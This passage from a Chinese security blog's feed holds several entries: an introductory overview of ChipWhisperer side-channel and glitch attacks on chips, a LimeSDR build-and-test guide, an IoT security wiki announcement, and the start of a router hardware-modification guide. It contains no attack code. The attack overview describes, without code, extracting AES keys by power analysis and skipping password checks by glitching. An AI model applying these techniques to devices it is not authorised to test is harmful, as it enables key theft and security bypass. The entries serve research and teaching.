href="#物理攻击" class="headerlink" title="物理攻击"></a>物理攻击</h2><p>真正的安全研究不能凌驾于真实的攻防场景，对于物联网安全而言，其核心目标是真实物理世界中的各种硬件设备，真实的攻击场景往往发生在直接针对硬件设备的攻击，因此物联网安全的基石在于物理层的安全，而针对物联网物理攻击手段，是当前物联网面临的最大安全风险之一。</p><p>物理攻击就是直接攻击设备本身和运行过程中的物理泄露，根据攻击过程和手段可以分为非侵入攻击、半侵入式攻击和侵入式攻击。ChipWhisperer 平台主要用做非侵入式攻击，包括侧信道和故障注入攻击等。</p><p>传统密码分析学认为一个密码算法在数学上安全就绝对安全,这一思想被Kelsey等学者在1998年提出的侧信道攻击(Side-channel Attacks,SCA)理论所打破。侧信道攻击与传统密码分析不同,侧信道攻击利用功耗、电磁辐射等方式所泄露的能量信息与内部运算操作数之间的相关性,通过对所泄露的信息与已知输入或输出数据之间的关系作理论分析,选择合适的攻击方案,获得与安全算法有关的关键信息。目前侧信道理论发展越发迅速，从最初的简单功耗分析（SPA），到多阶功耗分析（CPA），碰撞攻击、模板攻击、电磁功耗分析以及基于人工智能和机器学习的侧信道分析方式，侧信道攻击方式也推陈出新，从传统的直接能量采集发展到非接触式采集、远距离采集、行为侧信道等等。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/5b5a0b1/5b75d2d4909b4.png" alt=""><br>利用麦克风进行声波侧信道</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/5b5a0b1/5b75d2e0a0337.png" alt=""><br>利用软件无线电实施非接触电磁侧信道</p><p>故障攻击就是在设备执行加密过程中，引入一些外部因素使得加密的一些运算操作出现错误，从而泄露出跟密钥相关的信息的一种攻击。一些基本的假设：设定的攻击目标是中间状态值； 故障注入引起的中间状态值的变化；攻击者可以使用一些特定算法（故障分析）来从错误/正确密文对中获得密钥。<br>使用故障的不同场景： 利用故障来绕过一些安全机制（口令检测，文件访问权限，安全启动链）；产生错误的密文或者签名（故障分析）；组合攻击（故障+旁路）。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/5b5a0b1/5b75cdb77361a.png" alt=""><br>非侵入式电磁注入</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/5b5a0b1/5b75cdd85fc54.png" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/5b5a0b1/5b75ce4f3b061.png" alt=""><br>半侵入式光子故障注入</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/5b5a0b1/5b75cee97b9cb.png" alt=""><br>侵入式故障注入</p><h2 id="ChipWhisperer"><a href="#ChipWhisperer" class="headerlink" title="ChipWhisperer"></a>ChipWhisperer</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>本系列使用的版本是  CW1173 ChipWhisperer-Lite ，搭载 SAKURA-G 实验板，配合一块 CW303 XMEGA 作为目标测试板。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/5b5a0b1/5b7a9d9287a75.png" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/5b5a0b1/5b7a9d9c0bf77.jpg" alt=""></p><p>CW1173 是基于FPGA实现的硬件，软件端基于 python，具有丰富的扩展接口和官方提供的各类 API 供开发调用，硬件通过自带的 OpenADC 模块可以实现波形的捕获，不需要额外的示波器。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/5b5a0b1/5b756e8a59f7b.png" alt=""></p><p>板上自带有波形采集端口（MeaSure）和毛刺输出（Glitch）端口，并自带 MOSFET 管进行功率放大。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/5b5a0b1/5we5t3654h.jpg" alt=""></p><p>并提供多种接口触发设置，基本满足一般的攻击需求。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/5b5a0b1/5dgy2565fe.jpg" alt=""></p><h3 id="能量攻击"><a href="#能量攻击" class="headerlink" title="能量攻击"></a>能量攻击</h3><p>芯片物理结构为许多CMOS电路组合而成，CMOS 电路根据输入的不同电信号动态改变输出状态，实现0或1的表示，完成相应的运算，而不同的运算指令就是通过 CMOS 组合电路完成的，但 CMOS电路根据不同的输入和输出，其消耗的能量是不同的，例如汇编指令 ADD 和 MOV ，消耗的能量是不同的，同样的指令操作数不同，消耗的能量也是不同的，例如 MOV 1 和 MOV 2其能量消耗就是不同的，能量攻击就是利用芯片在执行不同的指令时，消耗能量不同的原理，实现秘钥破解。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/5b5a0b1/5b7582856ba4f.png" alt=""></p><p>常用的能量攻击方式就是在芯片的电源输入端（VCC）或接地端（GND）串联一个1到50欧姆的电阻，然后用示波器不断采集电阻两端的电压变化，形成波形图，根据欧姆定律，电压的变化等同于功耗的变化，因此在波形图中可以观察到芯片在执行不同加密运算时的功耗变化。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/5b5a0b1/5b75816101da2.png" alt=""></p><p>CW1173 提供能量波形采集端口，通过连接 板上的 MeaSure SMA 接口，就可以对能量波形进行采集，在利用chipwhisperer 开源软件就可以进行分析，可以实现简单能量分析、CPA攻击、模板攻击等。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/5b5a0b1/5b757f60339ab.png" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/5b5a0b1/5b757f906ba76.png" alt=""><br>通过 cpa 攻击 AES 加密算法获取密钥</p><h3 id="毛刺攻击"><a href="#毛刺攻击" class="headerlink" title="毛刺攻击"></a>毛刺攻击</h3><p>ChipWhisperer  提供对时钟、电压毛刺的自动化攻击功能，类似于 web 渗透工具 Burpsuite ，可以对毛刺的宽度、偏移、位置等等参数进行 fuzz ，通过连接板上的 Glitch SMA 接口，就可以输出毛刺，然后通过串口、web 等获取结果，判断毛刺是否注入成功。</p><p>时钟毛刺攻击是针对微控制器需要外部时钟晶振提供时钟信号，通过在原本的时钟信号上造成一个干扰，通过多路时钟信号的叠加产生时钟毛刺，也可以通过自定义的时钟选择器产生，CW1173  提供高达 300MHZ 的时钟周期控制，时钟是芯片执行指令的动力来源，通过时钟毛刺可以跳过某些关键逻辑判断，或输出错误数据。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/5b5a0b1/5b76d1077021e.png" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/5b5a0b1/5b76d0fef3796.png" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/5b5a0b1/588201161020.jpg" alt=""><br>通过 CW1173 时钟毛刺攻击跳过密码验证</p><p>电压毛刺是对芯片电源进行干扰造成故障，在一个很短的时间内，使电压迅速下降，造成芯片瞬间掉电，然后迅速恢复正常，确保芯片继续正常工作，可以实现如对加密算法中某些轮运算过程的干扰，造成错误输出，或跳过某些设备中的关键逻辑判断等等 。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/5b5a0b1/1sdt4543h54.jpg" alt=""></p><p>对嵌入式设备的电压毛刺攻击</p><h2 id="更多"><a href="#更多" class="headerlink" title="更多"></a>更多</h2><p>随着物理攻击理论和技术的进步，针对硬件芯片的防护手段也随之提高，芯片物理层的攻防一直在不断角力 ，现实环境中，能量采集会受到各种噪声因素的干扰，硬件厂商也会主动实施一些针对物理攻击的防护，单纯依靠  ChipWhisperer 平台难以实现真实场景的攻击，因此还需要结合电磁、声波、红外、光子等多重信息，以及对硬件进行修改，多重故障注入，引入智能分析模型等等组合手段，今后会进一步介绍一些基于 ChipWhisperer  的高级攻击方式和实战分析方法。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol><li>ChipWhisperer 官网 wiki <a href="https://wiki.newae.com/Main_Page" target="_blank" rel="noopener">https://wiki.newae.com/Main_Page</a></li><li>开源项目 <a href="https://github.com/newaetech/chipwhisperer" target="_blank" rel="noopener">https://github.com/newaetech/chipwhisperer</a></li><li>ChipSHOUTER 电磁故障平台  <a href="https://github.com/newaetech/ChipSHOUTER" target="_blank" rel="noopener">https://github.com/newaetech/ChipSHOUTER</a></li><li>USB 附加模块  <a href="https://github.com/scanlime/facewhisperer" target="_blank" rel="noopener">https://github.com/scanlime/facewhisperer</a></li><li>深度学习侧信道攻击 <a href="https://www.riscure.com/publication/lowering-bar-deep-learning-side-channel-analysis/" target="_blank" rel="noopener">https://www.riscure.com/publication/lowering-bar-deep-learning-side-channel-analysis/</a></li><li>使用毛刺攻击提取汽车 ECU 固件 <a href="https://www.riscure.com/publication/fault-injection-automotive-diagnostic-protocols/" target="_blank" rel="noopener">https://www.riscure.com/publication/fault-injection-automotive-diagnostic-protocols/</a></li><li>《物联网安全百科》 <a href="https://iot-security.wiki" target="_blank" rel="noopener">https://iot-security.wiki</a></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;传统基于穷举或纯数学理论层面的分析，对于现代高强度加密算法而言，算力有限导致无法实现穷举，算法的复杂性也无法通过数学工具直接破解，根据近代物
      
    
    </summary>
    
      <category term="物理攻击" scheme="http://yaseng.org/categories/%E7%89%A9%E7%90%86%E6%94%BB%E5%87%BB/"/>
    
    
      <category term="物理攻击" scheme="http://yaseng.org/tags/%E7%89%A9%E7%90%86%E6%94%BB%E5%87%BB/"/>
    
      <category term="芯片安全" scheme="http://yaseng.org/tags/%E8%8A%AF%E7%89%87%E5%AE%89%E5%85%A8/"/>
    
      <category term="ChipWhisperer" scheme="http://yaseng.org/tags/ChipWhisperer/"/>
    
      <category term="侧信道攻击" scheme="http://yaseng.org/tags/%E4%BE%A7%E4%BF%A1%E9%81%93%E6%94%BB%E5%87%BB/"/>
    
      <category term="毛刺攻击" scheme="http://yaseng.org/tags/%E6%AF%9B%E5%88%BA%E6%94%BB%E5%87%BB/"/>
    
  </entry>
  
  <entry>
    <title>LimeSDR 上手指南</title>
    <link href="http://yaseng.org/LimeSDR-introduce.html"/>
    <id>http://yaseng.org/LimeSDR-introduce.html</id>
    <published>2018-08-14T16:00:00.000Z</published>
    <updated>2018-08-24T04:34:11.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>LimeSDR 是一款完全开源的SDR产品，和 HackRF 一样，包括 PCB 设计图，FPGA 代码，HOST代码完全公开，方便研究和学习 SDR 系统原理。虽然市面上有很多 SDR 产品，但很少有像 LimeSDR 性价比这么高的。<br>LimeSDR 支持 100kHz 到 3.8GHz 频率范围，已经可以不需外置上变频器，即可完成短波应用的使用，另外LimeSDR 是一款完全开源的SDR产品包含了 2×2 MIMO 的支持，满足了大部分应用场景。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/5b7a9d/5b76b90f617c7.png" alt=""></p><p>通过它的一些应用来了解一下其灵活性：<br>蜂窝网络、WiFi、蓝牙、IoT协议（LoRa/SigFox等）、导航、气象信息、航空信息、海事信息、空间通信、还有广播和电视。<br>这只是 LimeSDR 应用场景的一小部分，你可以应用到你能想到的任何领域。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/5b7a9d/5b75c152a8b34.jpg" alt=""></p><h2 id="编译环境"><a href="#编译环境" class="headerlink" title="编译环境"></a>编译环境</h2><h3 id="软件结构"><a href="#软件结构" class="headerlink" title="软件结构"></a>软件结构</h3><p>Lime Suite 是一款支持多种硬件平台的软件，包括LimeSDR，LMS7002M收发器，以及使用基于 LMS7 开发的其他硬件。安装 Lime Suite 可以使许多 SDR 应用程序（如GQRX）可以通过中间适配组件 SoapySDR 适配多种 SDR 设备配合使用。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/5b7a9d/5b75c56bdcda8.png" alt=""></p><p>SoapySDR 是位于 LimeSDR 的驱动程序和 SDR 应用程序之间的胶水层。使用一个简单的包装器 (SoapyLMS7), LimeSDR 可以在任何 SoapySDR 或 Gr-OsmoSDR 支持的应用程序中使用。这包括编程环境, 如 Pothos 框架和 GNU Radio，以及像 GQRX 和 CubicSDR 这样的图形应用程序。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/5b7a9d/5b75c571305ca.png" alt=""></p><h3 id="安装UHD"><a href="#安装UHD" class="headerlink" title="安装UHD"></a>安装UHD</h3><p>Wiki：<a href="http://files.ettus.com/manual/page_build_guide.html" target="_blank" rel="noopener">http://files.ettus.com/manual/page_build_guide.html</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install libboost-all-dev libusb-1.0-0-dev python-mako doxygen python-docutils cmake build-essential git</span><br><span class="line">$ git clone https://github.com/EttusResearch/uhd</span><br><span class="line">$ cd uhd</span><br><span class="line">$ cd host &amp;&amp; mkdir build &amp;&amp; cd build</span><br><span class="line">$ cmake ../</span><br><span class="line">$ make -j5</span><br><span class="line">$ sudo make install</span><br><span class="line">$ sudo ldconfig</span><br></pre></td></tr></table></figure></p><h3 id="安装SoapySDR"><a href="#安装SoapySDR" class="headerlink" title="安装SoapySDR"></a>安装SoapySDR</h3><p>Wiki：<a href="https://github.com/pothosware/SoapySDR/wiki/BuildGuide" target="_blank" rel="noopener">https://github.com/pothosware/SoapySDR/wiki/BuildGuide</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install cmake g++ libpython-dev python-numpy swig</span><br><span class="line">$ git clone https://github.com/pothosware/SoapySDR.git</span><br><span class="line">$ cd SoapySDR</span><br><span class="line">$ git pull origin master</span><br><span class="line">$ mkdir build &amp;&amp; cd build</span><br><span class="line">$ cmake ..</span><br><span class="line">$ make -j5</span><br><span class="line">$ sudo make install</span><br><span class="line">$ sudo ldconfig</span><br></pre></td></tr></table></figure></p><h3 id="安装SoapyUHD"><a href="#安装SoapyUHD" class="headerlink" title="安装SoapyUHD"></a>安装SoapyUHD</h3><p>Wiki：<a href="https://github.com/pothosware/SoapyUHD/wiki" target="_blank" rel="noopener">https://github.com/pothosware/SoapyUHD/wiki</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ git clone https://github.com/pothosware/SoapyUHD.git</span><br><span class="line">$ cd SoapyUHD</span><br><span class="line">$ mkdir build &amp;&amp; cd build</span><br><span class="line">$ cmake ..</span><br><span class="line">$ make</span><br><span class="line">$ sudo make install</span><br></pre></td></tr></table></figure></p><h3 id="安装LimeSuite"><a href="#安装LimeSuite" class="headerlink" title="安装LimeSuite"></a>安装LimeSuite</h3><p>Wiki：<a href="http://wiki.myriadrf.org/Lime_Suite" target="_blank" rel="noopener">http://wiki.myriadrf.org/Lime_Suite</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ sudo add-apt-repository -y ppa:myriadrf/drivers</span><br><span class="line">$ sudo apt-get update</span><br><span class="line">$ sudo apt-get install git g++ cmake libsqlite3-dev libsoapysdr-dev libi2c-dev libusb-1.0-0-dev libwxgtk3.0-dev freeglut3-dev</span><br><span class="line">$ git clone https://github.com/myriadrf/LimeSuite.git</span><br><span class="line">$ cd LimeSuite</span><br><span class="line">$ mkdir builddir &amp;&amp; cd builddir</span><br><span class="line">$ cmake ../</span><br><span class="line">$ make -j5</span><br><span class="line">$ sudo make install</span><br><span class="line">$ sudo ldconfig</span><br></pre></td></tr></table></figure></p><p>输入下列命令使非ROOT用户可以访问LimeSDR这样基于USB的设备<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cd LimeSuite/udev-rules</span><br><span class="line">$ sudo sh ./install.sh</span><br></pre></td></tr></table></figure></p><p>安装上述驱动后，运行命令检查驱动是否安装成功<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/5b7a9d/5b75cab7f3135.png" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/5b7a9d/5b75cabd28388.png" alt=""></p><p>然后查看能不能找到设备<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/5b7a9d/5b75cac1b4a75.png" alt=""></p><h3 id="安装GNU-Radio、gr-osmosdr"><a href="#安装GNU-Radio、gr-osmosdr" class="headerlink" title="安装GNU Radio、gr-osmosdr"></a>安装GNU Radio、gr-osmosdr</h3><p>Wiki：<a href="https://www.gnuradio.org/doc/doxygen/build_guide.html" target="_blank" rel="noopener">https://www.gnuradio.org/doc/doxygen/build_guide.html</a><br>从源码构建<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get -y install git-core cmake g++ python-dev swig \</span><br><span class="line">$ pkg-config libfftw3-dev libboost-all-dev libcppunit-dev libgsl0-dev \</span><br><span class="line">$ libusb-dev libsdl1.2-dev python-wxgtk3.0 python-numpy \</span><br><span class="line">$ python-cheetah python-lxml doxygen libxi-dev python-sip \</span><br><span class="line">$ libqt4-opengl-dev libqwt-dev libfontconfig1-dev libxrender-dev \</span><br><span class="line">$ python-sip python-sip-dev python-qt4 python-sphinx libusb-1.0-0-dev \</span><br><span class="line">$ libcomedi-dev libzmq-dev</span><br><span class="line">$ git clone --recursive https://github.com/gnuradio/gnuradio.git</span><br><span class="line">$ cd gnuradio &amp;&amp; mkdir build &amp;&amp; cd build</span><br><span class="line">$ cmake ../</span><br><span class="line">$ make -j5</span><br><span class="line">$ make test</span><br><span class="line">$ sudo make install</span><br></pre></td></tr></table></figure></p><p>安装gr-osmosdr支持包<br>Wiki：<a href="http://osmocom.org/projects/gr-osmosdr/wiki" target="_blank" rel="noopener">http://osmocom.org/projects/gr-osmosdr/wiki</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install libsoapysdr-dev gr-fcdproplus</span><br><span class="line">$ git clone git://git.osmocom.org/gr-osmosdr</span><br><span class="line">$ cd gr-osmosdr &amp;&amp; mkdir build &amp;&amp; cd build/</span><br><span class="line">$ cmake ../</span><br><span class="line">$ make</span><br><span class="line">$ sudo make install</span><br><span class="line">$ sudo ldconfig</span><br></pre></td></tr></table></figure></p><p>安装之后，会看到Soapysdr support在Gnuradio enabled里<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/5b7a9d/5b75cc570512a.png" alt=""></p><h2 id="测试LimeSDR接收、发射通道"><a href="#测试LimeSDR接收、发射通道" class="headerlink" title="测试LimeSDR接收、发射通道"></a>测试LimeSDR接收、发射通道</h2><p>GNU Radio和gr-osmosdr安装完成后，我们加载一个接收信号的grc流程图<br>Grc流程图下载地址：<a href="https://1drv.ms/f/s!AsE4BpolygfCjGfspV7_Gno3rpy5" target="_blank" rel="noopener">https://1drv.ms/f/s!AsE4BpolygfCjGfspV7_Gno3rpy5</a><br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/5b7a9d/5b76b80f982d0.png" alt=""></p><p>RF增益设置为20，IF中频增益设置成12，BB基带增益设置成19<br>天线设置为LNAL 对应的是RX Channel 0<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/5b7a9d/5b76b8266f403.png" alt=""></p><p>然后运行，按下遥控钥匙，可以看到成功接收到433MHz遥控钥匙的信号，说明GNU Radio和gr-osmosdr安装没有问题。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/5b7a9d/5b76b8302335b.png" alt=""></p><p>测试通完接收通道后，我们测试下发射通道，做一个小型FM电台试试<br>*注意请在不干扰正常无线通讯的基础上进行实验<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/5b7a9d/5b76b8370cdd9.png" alt=""></p><p>在另一台电脑上打开SDRSharp将FM频率调到104MHz可以明显看到我们发射的信号<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/5b7a9d/5b5b1a8de685f.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;LimeSDR 是一款完全开源的SDR产品，和 HackRF 一样，包括 PCB 设计图，FPGA 代码，HOST代码完全公开，方便研究和学
      
    
    </summary>
    
      <category term="无线电安全" scheme="http://yaseng.org/categories/%E6%97%A0%E7%BA%BF%E7%94%B5%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="LimeSDR" scheme="http://yaseng.org/tags/LimeSDR/"/>
    
      <category term="无线电安全" scheme="http://yaseng.org/tags/%E6%97%A0%E7%BA%BF%E7%94%B5%E5%AE%89%E5%85%A8/"/>
    
      <category term="火腿肠" scheme="http://yaseng.org/tags/%E7%81%AB%E8%85%BF%E8%82%A0/"/>
    
  </entry>
  
  <entry>
    <title>《物联网安全百科》测试版上线</title>
    <link href="http://yaseng.org/iot-security-wiki-beta.html"/>
    <id>http://yaseng.org/iot-security-wiki-beta.html</id>
    <published>2018-06-21T16:00:00.000Z</published>
    <updated>2018-07-09T13:07:37.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本书是由伏宸安全实验发起的一个开源图书项目，目前属于测试版本，很多章节尚未完成，收录在日常研究过程中，总结的零散知识和心得经验，今后会不断完善内容，形成系统化的知识结构。</p><p>当今世界之发展，以大数据、人工智能为基石，网络由虚拟走向现实，连接世间万物，未来即是万物互联之时代，于是传统网络安全的边界亦由虚拟世界扩展到现实社会，诸如喧嚣尘上的智能家居、智能网联车、形形色色的智能芯片硬件，已经渗透进生活中的各个方面，商业窃密、敲诈勒索、钓鱼木马等等传统攻击手段，或将会演变成隐私监控、身份盗窃乃至危及到人身安全的现实攻击，未来安全行业的攻防主战场，是社会中的每一人，要之，安全之重，势如泰山，而安全之道在于攻守，本书亦多以真实攻守为例，略述万物互联时代攻守之思路，不敢传灯授教，但求燃一星火，以待将来。</p><p>至于攻守之道，古来久矣，上窥宇宙方圆之演化，下度红尘万物之百态，大抵皆备攻守之义，攻者，进也，取也，胜也，守者，退也，御也，全也。圣人取之以治天下，所谓不可胜者，守也，可胜者，攻也，守则不足，攻则有余，善守者藏于九地之下，善攻者动于九天之上，故能自保而全胜也。</p><p>某等学力尚浅，此书多有拾人牙慧，恣意妄言者，虽恐见笑于大方，然唯求先进之指教，拳拳之心，不可胜言。</p><h2 id="阅读"><a href="#阅读" class="headerlink" title="阅读"></a>阅读</h2><ul><li>在线阅读：<a href="https://iot-security.wiki" target="_blank" rel="noopener">iot-security.wiki</a>，<a href="">GitBook</a>，<a href="">国内镜像</a></li><li>项目地址：<a href="https://github.com/yaseng/iot-security-wiki" target="_blank" rel="noopener">github.com/yaseng/iot-security-wiki</a></li><li>下载：<a href="">pdf</a>,<a href="">epub</a></li></ul><h2 id="技术交流"><a href="#技术交流" class="headerlink" title="技术交流"></a>技术交流</h2><table><thead><tr><th>名称</th><th>IOT Security Wiki 0.1</th></tr></thead><tbody><tr><td>本书地址</td><td><a href="https://iot-security.wiki" target="_blank" rel="noopener">iot-security.wiki</a></td></tr><tr><td>伏宸安全实验室</td><td><a href="https://future-sec.com" target="_blank" rel="noopener">future-sec.com</a></td></tr><tr><td>IOT Security</td><td><a href="https://iot-security.org" target="_blank" rel="noopener">iot-security.org</a></td></tr><tr><td>Yaseng Blog</td><td><a href="https://yaseng.org">yaseng.org</a></td></tr><tr><td>知乎专栏</td><td><a href="https://zhuanlan.zhihu.com/future-sec" target="_blank" rel="noopener">zhuanlan.zhihu.com</a></td></tr><tr><td>邮箱</td><td>info@iot-security.wiki</td></tr><tr><td>qq 交流群</td><td>306482276</td></tr><tr><td>微信公众号</td><td><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/future-sec-qrcode.jpg" alt=""></td></tr><tr><td>微信交流群</td><td><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/wechat.jpg" alt=""></td></tr></tbody></table><h2 id="参与"><a href="#参与" class="headerlink" title="参与"></a>参与</h2><p>物联网安全随着技术的不断革新，是一个需要持续创新和学习的领域，也是一个涉及多学科、多门类的研究方向，单个的力量终究是有限的，此希望有志于此的读者能跟我们积极分享自己独到的观点和见解，此开源图书项目，编者笔力尚拙，难免多生谬误，希望各位多提宝贵意见和建议，欢迎大家<a href="https://github.com/yaseng/iot-security-wiki" target="_blank" rel="noopener">参与项目</a>。</p><h3 id="修订记录"><a href="#修订记录" class="headerlink" title="修订记录"></a>修订记录</h3><ul><li>2018-6-20  0.1 测试版本 </li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;本书是由伏宸安全实验发起的一个开源图书项目，目前属于测试版本，很多章节尚未完成，收录在日常研究过程中，总结的零散知识和心得经验，今后会不断完
      
    
    </summary>
    
      <category term="物联网安全" scheme="http://yaseng.org/categories/%E7%89%A9%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="芯片安全" scheme="http://yaseng.org/tags/%E8%8A%AF%E7%89%87%E5%AE%89%E5%85%A8/"/>
    
      <category term="无线电安全" scheme="http://yaseng.org/tags/%E6%97%A0%E7%BA%BF%E7%94%B5%E5%AE%89%E5%85%A8/"/>
    
      <category term="物联网安全" scheme="http://yaseng.org/tags/%E7%89%A9%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8/"/>
    
      <category term="智能硬件安全" scheme="http://yaseng.org/tags/%E6%99%BA%E8%83%BD%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
    
      <category term="锁具安全" scheme="http://yaseng.org/tags/%E9%94%81%E5%85%B7%E5%AE%89%E5%85%A8/"/>
    
      <category term="物理安全" scheme="http://yaseng.org/tags/%E7%89%A9%E7%90%86%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>物联网安全硬件修改系列-硬改</title>
    <link href="http://yaseng.org/iot-security-hardware-modification.html"/>
    <id>http://yaseng.org/iot-security-hardware-modification.html</id>
    <published>2018-06-20T16:00:00.000Z</published>
    <updated>2018-06-29T10:39:05.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>硬件层面的修改在现实生活中是相当常见的事情，所谓的硬改、魔改、硬破等等说法，指的就是在硬件层面对设备进行diy功能改造。例如针对传统路由器的硬件架构，替换大容量的内存和闪存芯片，使之能够刷openwrt系统；对某些设备进行配置层的升级，如iPhone，小米等手机内存扩容，使之具有更大容量的存储空间和运行内存； 以及对设备的破解，例如ps,xbox等游戏主机系列的硬破、软破，还有对各种加密录音笔，摄像头，加密U盘和硬盘的破解。<br>研究硬件修改对硬件diy改造，以及厂商在硬件层的安全防护具有非常重要意义。硬件层修改分为硬改和软改两个部分，硬改是对硬件中芯片和电路的改造、替换等，软改是针对芯片固件的修改、重打包等。本节将用具体的几个实例展示如何对设备进行硬改。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/IMG_3234.jpg" alt=""></p><h2 id="硬改路由器刷openwrt"><a href="#硬改路由器刷openwrt" class="headerlink" title="硬改路由器刷openwrt"></a>硬改路由器刷openwrt</h2><h3 id="修改方案"><a href="#修改方案" class="headerlink" title="修改方案"></a>修改方案</h3><p>目前市面上主流的路由器，平时家用功能或许够用，但如果需要一些高级功能，比如屏蔽广告，挂vpn等等又难以实现，而采用openwrt系统可以充分满足定制化和diy的需求，openwrt是一个高度模块化、高度自动化的嵌入式Linux系统，拥有强大的网络组件和扩展性，但如果专门购买openwrt系统的路由器，价格却又不是十分亲民，如果能把传统路由器通过硬件修改，刷入openwrt系统，就是个低成本的解决方案了，本次用来硬改的路由器具体参数如下：品牌：TP-Link， 型号：WR842N，版本：v4.3，采用高通QCA9533的主控，16M的闪存、2M的flash芯片，虽然是老机器，但除了不能外接usb，基本满足需求，当然价格也便宜。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180606_150638.jpg" alt=""></p><p>不得不说TP-Link最近出的机器，硬件缩水越来越严重，新的机器，闪存都集成到了CPU里面，基本没有硬改的空间了。</p><p><img 